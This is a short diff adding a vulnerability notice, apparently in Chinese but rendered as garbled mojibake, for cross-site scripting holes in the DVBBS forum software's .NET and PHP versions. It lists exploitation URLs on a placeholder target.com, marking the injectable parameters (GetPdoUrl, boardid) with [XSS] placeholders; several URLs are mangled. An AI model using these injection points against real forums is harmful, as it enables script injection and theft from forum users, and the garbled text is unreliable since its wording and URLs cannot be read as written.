@@ -1,0 +1,9 @@
+¶¯ÍøÂÛÌ³(DVBBS)NETºÍPHP°æÒ³Ãæ¿çÕ¾Â©¶´
+Â©¶´ÀûÓÃ:
+NET°æ±¾Â©¶´
+http://www.target.com/prompt.aspx?GetPdoUrl=[XSS]
+PHP°æ±¾Â©¶´
+[XSS''>http://www.target.com/boardhelp.php?boardid=0">[XSS]
+[XSS''>http://www.target.com/forum_savvy.php?boardid=16">[XSS]
+[XSS''>http://www.target.com/boardstat.php?boardid=0">[XSS]
+
